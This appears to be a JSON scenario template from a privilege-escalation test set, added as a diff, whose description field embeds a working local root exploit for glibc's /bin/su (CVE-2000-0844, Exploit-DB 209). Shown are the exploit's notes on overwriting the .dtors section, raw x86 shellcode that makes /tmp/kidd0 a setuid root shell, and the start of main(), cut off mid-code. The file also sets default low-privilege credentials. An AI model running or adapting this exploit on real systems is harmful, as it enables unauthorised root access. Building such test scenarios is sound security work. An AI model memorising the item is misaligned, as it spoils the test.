@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_209",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: GLIBC - '/bin/su' Local Privilege Escalation (OSVDB-14794;CVE-2000-0844)\n\nExploit source code (209.c):\n```\n/*\n *\n *  Working exploit for glibc executing /bin/su\n *\n *  To exploit this i have used a technique that\n *  overwrites the .dtors section of /bin/su program\n *  with the address of the shellcode, so, the program\n *  executes it when main returns or exit() is called\n *\n *   Thanks a lot to rwxrwxrwx <jmbr@qualys.com> for\n *  explaining me this technique :)\n *\n *  The address of .dtors section can be easily obtained\n *  with objdump -h filename.\n *\n *  One the address of .dtors is known, the shellcode is\n *  pushed in a env var with a lot of nops, and the size\n *  of the \"piece\" of stack that must be \"eaten\" is calculated\n *  with a loop. At this point, we know the exact values of\n *  all parameters exept the address of the shellcode, but this\n *  value can be guessed with a little work :)\n *\n *  Tested on:       Red Hat 6.2, 6.1\n *                   SuSE 6.2\n *\n *  Thanks to Chui, aViNash, RaiSe, |CoDeX|, YbY...\n *  (y todos los que me olvido)\n *\n *\n *  Doing / localcore - doing@netsearch-ezine.com\n *\n */\n\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <string.h>\n#include <getopt.h>\n#include <dirent.h>\n\nchar *shellcode =\n\"\\x31\\xc0\\x83\\xc0\\x17\\x31\\xdb\\xcd\\x80\\xeb\"\n\"\\x30\\x5f\\x31\\xc9\\x88\\x4f\\x17\\x88\\x4f\\x1a\"\n\"\\x8d\\x5f\\x10\\x89\\x1f\\x8d\\x47\\x18\\x89\\x47\"\n\"\\x04\\x8d\\x47\\x1b\\x89\\x47\\x08\\x31\\xc0\\x89\"\n\"\\x47\\x0c\\x8d\\x0f\\x8d\\x57\\x0c\\x83\\xc0\\x0b\"\n\"\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\\x80\\xe8\"\n\"\\xcb\\xff\\xff\\xff\\x41\\x41\\x41\\x41\\x41\\x41\"\n\"\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\"\n\"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x30\\x2d\\x63\"\n\"\\x30\"\n\"chown root /tmp/kidd0;chmod 4777 /tmp/kidd0\";\n\nchar *LC_MESSAGES = \"/tmp/LC_MESSAGES\";\nint NOP_LEN = 12000;\n\nchar *msgfmt = \"/usr/bin/msgfmt\";\nchar *objdump = \"/usr/bin/objdump\";\nchar *language = NULL;\n\nchar *make_format_string(unsigned long, int, int);\nunsigned long get_dtors_addr();\nchar *make_ret_str(unsigned long, int);\nvoid calculate_eat_space(int *, int *);\nvoid checkfor(char*);\nvoid make_suid_shell();\nvoid search_valid_language();\n\nint main(int argc, char **argv)\n{\n  char execbuf[1024];\n  unsigned long dtors_addr = 0xAABBCCDD;\n  unsigned long sh_addr = 0xBFFFFFFF;\n  FILE *f;\n  char *env[3];\n  char *args[6];\n  int eat = 0, pad = 0, fd;\n  char *nop_env;\n  int offset = 5000;\n  struct stat st;\n  int pid, c;\n  char randfile[1024];\n  char *args2[2], opt;\n\n  printf(\"glibc xploit for /bin/su - by Doing <jdoing@bigfoot.com>\\n\");\n  printf(\"Usage: %s [options]\\n\", argv[0]);\n  printf(\" -o offset [default: 5000]\\n\");\n  printf(\" -n nops   [default: 12000]\\n\");\n  printf(\" -m path to msgfmt [default: /usr/bin/msgfmt]\\n\");\n  printf(\" -O path to objdump [default: /usr/bin/objdump]\\n\");\n  printf(\" -e eat:pad set eat and pad values [default: calculate\nthem]\\n\");\n  printf(\" -l language set language used in env var [default: search\nit]\\n\");\n  printf(\"Enjoy!\\n\\n\");\n\n  while ((opt = getopt(argc, argv, \"o:n:m:O:e:l:\")) != EOF)\n    switch(opt) {\n    case 'o':\n      offset = atoi(optarg);\n      b\n```",
+  "cve": "OSVDB-14794;CVE-2000-0844",
+  "exploitdb_id": "209",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_209",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
